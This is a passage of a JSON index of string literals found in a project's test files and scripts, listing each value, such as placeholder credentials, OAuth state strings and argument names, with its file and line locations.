        "scripts/test_workflows_with_act.py:28"
      ]
    },
    "staging_netra": {
      "value": "staging_netra",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:99"
      ]
    },
    "staging_password": {
      "value": "staging_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:150",
        "auth_service/tests/test_critical_staging_database_failures.py:202",
        "auth_service/tests/test_critical_staging_database_failures.py:251",
        "auth_service/tests/test_critical_staging_database_failures.py:290",
        "auth_service/tests/test_critical_staging_database_failures.py:330",
        "auth_service/tests/test_critical_staging_database_failures.py:377"
      ]
    },
    "staging_secure_password_123": {
      "value": "staging_secure_password_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:168"
      ]
    },
    "staging_test_code": {
      "value": "staging_test_code",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1415"
      ]
    },
    "staging_test_state": {
      "value": "staging_test_state",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1416"
      ]
    },
    "staging_user": {
      "value": "staging_user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:201",
        "auth_service/tests/test_critical_staging_database_failures.py:289",
        "auth_service/tests/test_critical_staging_database_failures.py:329",
        "auth_service/tests/test_critical_staging_database_failures.py:376"
      ]
    },
    "staging_validation_": {
      "value": "staging_validation_",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:225"
      ]
    },
    "standalone": {
      "value": "standalone",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:473"
      ]
    },
    "standard": {
      "value": "standard",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:112",
        "scripts/compliance/test_refactor_helper.py:132",
        "scripts/test_service_startup.py:32"
      ]
    },
    "start_line": {
      "value": "start_line",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:59"
      ]
    },
    "start_time": {
      "value": "start_time",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:18",
        "scripts/real_service_test_metrics.py:85",
        "scripts/test_coordination_fixes.py:69"
      ]
    },
    "starting": {
      "value": "starting",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:182"
      ]
    },
    "startup or login or websocket": {
      "value": "startup or login or websocket",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:237"
      ]
    },
    "startup.test": {
      "value": "startup.test",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:143"
      ]
    },
    "startup_timeout": {
      "value": "startup_timeout",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:44",
        "scripts/test_cold_start_e2e.py:148"
      ]
    },
    "state": {
      "value": "state",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:120",
        "auth_service/tests/integration/test_auth_oauth_errors.py:124",
        "auth_service/tests/integration/test_auth_oauth_errors.py:128",
        "auth_service/tests/integration/test_auth_oauth_google.py:108",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:151",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:190",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:266",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:298",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:304",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:336"
      ]
    },
    "state with spaces": {
      "value": "state with spaces",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:89"
      ]
    },
    "state/with/slashes": {
      "value": "state/with/slashes",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:90"
      ]
    },
    "state:": {
      "value": "state:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:367"
      ]
    },
    "state=": {
      "value": "state=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:44",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:61"
      ]
    },
    "state_valid": {
      "value": "state_valid",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:308",
        "auth_service/tests/integration/test_redis_connection_failover.py:329"
      ]
    },
    "status": {
      "value": "status",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:45",
        "netra_backend/app/agents/test_agent_initialization.py:161",
        "auth_service/tests/auth-service-down-critical-scenarios.py:187",
        "auth_service/tests/integration/test_oauth_flows_sync.py:65",
        "auth_service/tests/test_auth_startup_integration.py:122",
        "auth_service/tests/test_auth_startup_integration.py:128",
        "auth_service/tests/test_auth_startup_integration.py:129",
        "auth_service/tests/test_postgres_compliance.py:244",
        "scripts/fix_test_batch.py:248",
        "scripts/fix_test_batch.py:250"
      ]
    },
    "status_code": {
      "value": "status_code",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:274",
        "auth_service/tests/auth-service-down-critical-scenarios.py:279",
        "auth_service/tests/auth-service-down-critical-scenarios.py:281",
        "auth_service/tests/auth-service-down-critical-scenarios.py:289",
        "auth_service/tests/auth-service-down-critical-scenarios.py:301",
        "auth_service/tests/integration/test_auth_oauth_errors.py:168",
        "auth_service/tests/integration/test_auth_oauth_errors.py:176",
        "auth_service/tests/integration/test_auth_oauth_errors.py:184",
        "auth_service/tests/integration/test_auth_oauth_errors.py:192",
        "auth_service/tests/integration/test_auth_oauth_errors.py:208"
      ]
    },
    "stop": {
      "value": "stop",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:113",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:113"
      ]
    },
    "storage": {
      "value": "storage",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:908"
      ]
    },
    "store": {
      "value": "store",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:33"
      ]
    },
    "store_true": {
      "value": "store_true",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:234",
        "scripts/auto_fix_test_sizes.py:718",
        "scripts/auto_fix_test_sizes.py:724",
        "scripts/auto_fix_test_violations.py:919",
        "scripts/auto_fix_test_violations.py:921",
        "scripts/auto_fix_test_violations.py:923",
        "scripts/auto_fix_test_violations.py:929",
        "scripts/auto_fix_test_violations.py:931",
        "scripts/auto_fix_test_violations.py:933",
        "scripts/ci/check_test_stubs.py:107"
      ]
    },
    "strategies": {
      "value": "strategies",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:92",
        "scripts/compliance/demo_test_size_enforcement.py:94",
        "scripts/compliance/demo_test_size_enforcement.py:95",
        "scripts/compliance/test_refactor_helper.py:106",
        "scripts/compliance/test_refactor_helper.py:710",
        "scripts/compliance/test_refactor_helper.py:714",
        "scripts/compliance/test_refactor_helper.py:729"
      ]
    },
    "strategy": {
      "value": "strategy",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:589",
        "scripts/compliance/test_size_validator.py:398"
      ]
    },
    "stream": {
      "value": "stream",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:92"
      ]
    },
    "stress": {
      "value": "stress",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:100"
      ]
    },
    "structural_similarity": {
      "value": "structural_similarity",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:374",
        "scripts/analyze_test_overlap.py:631"
      ]
    },
    "stub": {
      "value": "stub",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:238",
        "scripts/comprehensive_test_fixer.py:216"
      ]
    },
    "sub": {
      "value": "sub",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:167",
        "auth_service/tests/base/test_mixins.py:182",
        "auth_service/tests/base/test_mixins.py:274",
        "auth_service/tests/base/test_mixins.py:279",
        "auth_service/tests/factories/token_factory.py:36",
        "auth_service/tests/factories/token_factory.py:132",
        "auth_service/tests/factories/token_factory.py:248",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:462",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:519",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:987"
      ]
    },
    "subject": {
      "value": "subject",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:77"
      ]
    },
    "success": {
      "value": "success",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:65",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:104",
        "auth_service/tests/auth-service-down-critical-scenarios.py:276",
        "auth_service/tests/auth-service-down-critical-scenarios.py:279",
        "auth_service/tests/auth-service-down-critical-scenarios.py:281",
        "auth_service/tests/auth-service-down-critical-scenarios.py:288",
        "auth_service/tests/auth-service-down-critical-scenarios.py:290",
        "auth_service/tests/factories/audit_factory.py:53",
        "auth_service/tests/factories/audit_factory.py:176",
        "auth_service/tests/integration/test_redis_connection_failover.py:311"
      ]
    },
    "success_count": {
      "value": "success_count",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:210",
        "scripts/test_backend_optimized.py:268",
        "scripts/test_backend_optimized.py:335"
      ]
    },
    "success_rate": {
      "value": "success_rate",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:157",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:201",
        "scripts/batch_fix_and_test.py:145",
        "scripts/test_backend_optimized.py:211",
        "scripts/test_backend_optimized.py:233",
        "scripts/test_backend_optimized.py:233",
        "scripts/test_backend_optimized.py:269",
        "scripts/test_backend_optimized.py:336",
        "scripts/test_backend_optimized.py:438",
        "scripts/test_backend_optimized.py:440"
      ]
    },
    "successful_requests": {
      "value": "successful_requests",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:265"
      ]
    },
    "suggest": {
      "value": "suggest",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:677",
        "scripts/compliance/test_refactor_helper.py:712"
      ]
    },
    "suggested_fixes": {
      "value": "suggested_fixes",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:292"
      ]
    },
    "suggestions": {
      "value": "suggestions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:82"
      ]
    },
    "summary": {
      "value": "summary",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:408",
        "scripts/analyze_test_mocks.py:191",
        "scripts/analyze_test_overlap.py:347",
        "scripts/analyze_test_overlap.py:366",
        "scripts/analyze_test_overlap.py:442",
        "scripts/analyze_test_overlap.py:444",
        "scripts/analyze_test_overlap.py:449",
        "scripts/analyze_test_overlap.py:451",
        "scripts/analyze_test_overlap.py:470",
        "scripts/analyze_test_overlap.py:523"
      ]
    },
    "superadmin": {
      "value": "superadmin",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1118"
      ]
    },
    "superuser": {
      "value": "superuser",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:110",
        "auth_service/tests/test_auth_token_security.py:374"
      ]
    },
    "svc_id": {
      "value": "svc_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:103",
        "auth_service/tests/test_auth_token_validation.py:177",
        "auth_service/tests/test_auth_token_validation.py:254",
        "auth_service/tests/test_auth_token_validation.py:282",
        "auth_service/tests/unified/test_jwt_validation.py:184"
      ]
    },
    "syntax errors remain - manual intervention may be needed": {
      "value": "syntax errors remain - manual intervention may be needed",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:295"
      ]
    },
    "syntax errors remain:": {
      "value": "syntax errors remain:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_errors.py:264"
      ]
    },
    "syntax_error": {
      "value": "syntax_error",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:141",
        "scripts/compliance/real_test_requirements_enforcer.py:200",
        "scripts/compliance/real_test_validator.py:96"
      ]
    },
    "syntax_valid": {
      "value": "syntax_valid",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:307",
        "scripts/test_workflows_with_act.py:329",
        "scripts/test_workflows_with_act.py:345"
      ]
    },
    "sys": {
      "value": "sys",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:131"
      ]
    },
    "sys.path": {
      "value": "sys.path",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:153"
      ]
    },
    "system": {
      "value": "system",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:213"
      ]
    },
    "system:manage_settings": {
      "value": "system:manage_settings",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:30"
      ]
    },
    "system:view_logs": {
      "value": "system:view_logs",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:29"
      ]
    },
    "system:view_status": {
      "value": "system:view_status",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:187"
      ]
    },
    "t=": {
      "value": "t=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:112"
      ]
    },
    "table_output": {
      "value": "table_output",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:138"
      ]
    },
    "table_output_format": {
      "value": "table_output_format",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:161"
      ]
    },
    "tampered123": {
      "value": "tampered123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:68"
      ]
    },
    "target": {
      "value": "target",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:105",
        "scripts/analyze_test_mocks.py:126",
        "scripts/analyze_test_mocks.py:159",
        "scripts/analyze_test_mocks.py:181",
        "scripts/analyze_test_mocks.py:182"
      ]
    },
    "target_duration": {
      "value": "target_duration",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:56",
        "scripts/test_backend_optimized.py:62",
        "scripts/test_backend_optimized.py:68",
        "scripts/test_backend_optimized.py:74",
        "scripts/test_backend_optimized.py:80",
        "scripts/test_backend_optimized.py:90",
        "scripts/test_backend_optimized.py:99",
        "scripts/test_backend_optimized.py:167",
        "scripts/test_backend_optimized.py:167"
      ]
    },
    "target_test": {
      "value": "target_test",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:124"
      ]
    },
    "tax_season": {
      "value": "tax_season",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:35"
      ]
    },
    "team_collaboration": {
      "value": "team_collaboration",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:101",
        "scripts/business_value_test_index.py:422",
        "scripts/business_value_test_index.py:496"
      ]
    },
    "team|collaboration|sharing|permissions": {
      "value": "team|collaboration|sharing|permissions",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:101"
      ]
    },
    "tearDown": {
      "value": "tearDown",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:210"
      ]
    },
    "teardown": {
      "value": "teardown",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:210"
      ]
    },
    "teardown_method": {
      "value": "teardown_method",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:210"
      ]
    },
    "ten": {
      "value": "ten",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:346",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:369"
      ]
    },
    "test": {
      "value": "test",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:9",
        "auth_service/tests/config/test_env.py:21",
        "auth_service/tests/config/test_env.py:149",
        "auth_service/tests/config/test_settings.py:88",
        "auth_service/tests/conftest.py:27",
        "auth_service/tests/test_auth_service_integration_reliability.py:35",
        "auth_service/tests/test_auth_service_integration_reliability.py:43",
        "auth_service/tests/test_auth_startup_integration.py:40",
        "auth_service/tests/test_auth_startup_integration.py:228",
        "auth_service/tests/test_auth_token_generation.py:245"
      ]
    },
    "test directories** identified\n- **": {
      "value": "test directories** identified\n- **",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:160"
      ]
    },
    "test files": {
      "value": "test files",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:45",
        "scripts/autonomous_review/test_reviewer.py:181",
        "scripts/compliance/test_size_validator.py:73",
        "scripts/fix_all_test_issues.py:217",
        "scripts/fix_test_syntax_errors.py:236",
        "scripts/generate_test_audit.py:176"
      ]
    },
    "test files are already failing!": {
      "value": "test files are already failing!",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:723"
      ]
    },
    "test files for category '": {
      "value": "test files for category '",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:316"
      ]
    },
    "test files to validate...": {
      "value": "test files to validate...",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:83"
      ]
    },
    "test files** across the project (excluding dependencies)\n- **": {
      "value": "test files** across the project (excluding dependencies)\n- **",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:158"
      ]
    },
    "test files, found": {
      "value": "test files, found",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:718"
      ]
    },
    "test files:": {
      "value": "test files:",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:82"
      ]
    },
    "test functions from": {
      "value": "test functions from",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:75"
      ]
    },
    "test quality issues": {
      "value": "test quality issues",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:257"
      ]
    },
    "test request": {
      "value": "test request",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:116"
      ]
    },
    "test requirement violations:": {
      "value": "test requirement violations:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:117"
      ]
    },
    "test stubs in production code": {
      "value": "test stubs in production code",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:48",
        "scripts/ci/check_test_stubs.py:61"
      ]
    },
    "test(": {
      "value": "test(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:156"
      ]
    },
    "test*": {
      "value": "test*",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:72"
      ]
    },
    "test*.py": {
      "value": "test*.py",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:41",
        "scripts/generate_test_audit.py:95"
      ]
    },
    "test-act-simple.yml": {
      "value": "test-act-simple.yml",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:284"
      ]
    },
    "test-api-key": {
      "value": "test-api-key",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:84",
        "scripts/test_backend.py:90",
        "scripts/test_backend.py:91"
      ]
    },
    "test-branch": {
      "value": "test-branch",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:191"
      ]
    },
    "test-clickhouse-password-for-integration-testing": {
      "value": "test-clickhouse-password-for-integration-testing",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:213"
      ]
    },
    "test-client-id": {
      "value": "test-client-id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:109"
      ]
    },
    "test-client-id.googleusercontent.com": {
      "value": "test-client-id.googleusercontent.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:44",
        "auth_service/tests/test_critical_oauth_environment_failures.py:129",
        "auth_service/tests/test_critical_oauth_environment_failures.py:177",
        "auth_service/tests/test_critical_oauth_environment_failures.py:185"
      ]
    },
    "test-client-secret": {
      "value": "test-client-secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:45",
        "auth_service/tests/test_critical_oauth_environment_failures.py:90",
        "auth_service/tests/test_critical_oauth_environment_failures.py:186"
      ]
    },
    "test-db-host": {
      "value": "test-db-host",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:50",
        "auth_service/tests/test_critical_staging_database_failures.py:108"
      ]
    },
    "test-env": {
      "value": "test-env",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:189"
      ]
    },
    "test-fernet-key-for-testing-only-base64encode=": {
      "value": "test-fernet-key-for-testing-only-base64encode=",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:83"
      ]
    },
    "test-gemini-key-from-env": {
      "value": "test-gemini-key-from-env",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:53",
        "scripts/test_staging_config.py:112"
      ]
    },
    "test-github-client-id": {
      "value": "test-github-client-id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:40",
        "auth_service/tests/config/test_env.py:204",
        "auth_service/tests/config/test_settings.py:55"
      ]
    },
    "test-github-client-secret": {
      "value": "test-github-client-secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:41",
        "auth_service/tests/config/test_settings.py:56"
      ]
    },
    "test-github-secret": {
      "value": "test-github-secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:205"
      ]
    },
    "test-google-client": {
      "value": "test-google-client",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:92"
      ]
    },
    "test-google-client-id": {
      "value": "test-google-client-id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:202"
      ]
    },
    "test-google-client-id-for-integration-testing": {
      "value": "test-google-client-id-for-integration-testing",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:208"
      ]
    },
    "test-google-client-id.apps.googleusercontent.com": {
      "value": "test-google-client-id.apps.googleusercontent.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:38",
        "auth_service/tests/config/test_settings.py:53"
      ]
    },
    "test-google-client-secret": {
      "value": "test-google-client-secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:39",
        "auth_service/tests/config/test_settings.py:54"
      ]
    },
    "test-google-client-secret-for-integration-testing": {
      "value": "test-google-client-secret-for-integration-testing",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:209"
      ]
    },
    "test-google-secret": {
      "value": "test-google-secret",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:93"
      ]
    },
    "test-jwt-key-from-env": {
      "value": "test-jwt-key-from-env",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:54",
        "scripts/test_staging_config.py:127"
      ]
    },
    "test-jwt-secret-key-32-chars-long": {
      "value": "test-jwt-secret-key-32-chars-long",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:46",
        "auth_service/tests/test_critical_oauth_environment_failures.py:92",
        "auth_service/tests/test_critical_oauth_environment_failures.py:132"
      ]
    },
    "test-jwt-secret-key-for-integration-testing-must-be-32-chars-minimum": {
      "value": "test-jwt-secret-key-for-integration-testing-must-be-32-chars-minimum",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:210"
      ]
    },
    "test-jwt-secret-key-that-is-long-enough-for-testing-purposes": {
      "value": "test-jwt-secret-key-that-is-long-enough-for-testing-purposes",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:39",
        "auth_service/tests/factories/token_factory.py:19"
      ]
    },
    "test-jwt-secret-key-that-is-long-enough-for-testing-purposes-and-very-secure": {
      "value": "test-jwt-secret-key-that-is-long-enough-for-testing-purposes-and-very-secure",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:22"
      ]
    },
    "test-oauth-client-id": {
      "value": "test-oauth-client-id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:202"
      ]
    },
    "test-oauth-hmac-secret-32-chars": {
      "value": "test-oauth-hmac-secret-32-chars",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:91",
        "auth_service/tests/test_critical_oauth_environment_failures.py:131"
      ]
    },
    "test-oauth-secret": {
      "value": "test-oauth-secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:203"
      ]
    },
    "test-related process(es):": {
      "value": "test-related process(es):",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:106"
      ]
    },
    "test-secret": {
      "value": "test-secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:157",
        "auth_service/tests/test_auth_token_validation.py:181",
        "auth_service/tests/test_auth_token_validation.py:258",
        "auth_service/tests/test_critical_oauth_environment_failures.py:149"
      ]
    },
    "test-secret-key-for-testing-only-must-be-at-least-32-chars": {
      "value": "test-secret-key-for-testing-only-must-be-at-least-32-chars",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:82"
      ]
    },
    "test-service": {
      "value": "test-service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:106",
        "auth_service/tests/test_auth_token_generation.py:245",
        "auth_service/tests/test_auth_token_security.py:345",
        "auth_service/tests/test_auth_token_validation.py:70",
        "auth_service/tests/test_auth_token_validation.py:223"
      ]
    },
    "test-service-id": {
      "value": "test-service-id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:48"
      ]
    },
    "test-service-name": {
      "value": "test-service-name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:71"
      ]
    },
    "test-service-secret-32-chars-long": {
      "value": "test-service-secret-32-chars-long",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:47"
      ]
    },
    "test-service-secret-for-cross-service-auth-32-chars-minimum-length": {
      "value": "test-service-secret-for-cross-service-auth-32-chars-minimum-length",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:211"
      ]
    },
    "test-session": {
      "value": "test-session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:37",
        "auth_service/tests/test_auth_service_integration_reliability.py:44"
      ]
    },
    "test-staging-client-id": {
      "value": "test-staging-client-id",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:44",
        "auth_service/test_url_construction.py:45"
      ]
    },
    "test-staging-client-secret": {
      "value": "test-staging-client-secret",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:45",
        "auth_service/test_url_construction.py:46"
      ]
    },
    "test-staging-jwt-secret-key-12345678901234567890": {
      "value": "test-staging-jwt-secret-key-12345678901234567890",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:43",
        "auth_service/test_url_construction.py:44"
      ]
    },
    "test-staging-service-secret-12345678901234567890": {
      "value": "test-staging-service-secret-12345678901234567890",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:42",
        "auth_service/test_url_construction.py:43"
      ]
    },
    "test-token-123": {
      "value": "test-token-123",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:85"
      ]
    },
    "test-token-no-redis": {
      "value": "test-token-no-redis",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:434"
      ]
    },
    "test-token-server-error": {
      "value": "test-token-server-error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:141"
      ]
    },
    "test-token-when-service-down": {
      "value": "test-token-when-service-down",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:97"
      ]
    },
    "test-user": {
      "value": "test-user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:38",
        "auth_service/tests/unified/test_jwt_validation.py:154",
        "auth_service/tests/unified/test_jwt_validation.py:175",
        "auth_service/tests/unified/test_jwt_validation.py:242"
      ]
    },
    "test-user-123": {
      "value": "test-user-123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:43",
        "auth_service/tests/test_single_database.py:82",
        "auth_service/tests/test_single_database.py:88",
        "auth_service/tests/test_token_blacklisting_basics.py:33",
        "auth_service/tests/unified/test_jwt_validation.py:43"
      ]
    },
    "test-user-456": {
      "value": "test-user-456",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:43",
        "auth_service/tests/unified/test_jwt_validation.py:128"
      ]
    },
    "test-user-789": {
      "value": "test-user-789",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:202"
      ]
    },
    "test.com": {
      "value": "test.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:58"
      ]
    },
    "test/repo": {
      "value": "test/repo",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:44",
        "scripts/test_verify_workflow.py:62",
        "scripts/test_verify_workflow_status.py:90",
        "scripts/test_verify_workflow_status.py:97",
        "scripts/test_verify_workflow_status_corrected.py:97",
        "scripts/test_verify_workflow_status_corrected.py:106"
      ]
    },
    "test1": {
      "value": "test1",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:370",
        "scripts/analyze_test_overlap.py:424",
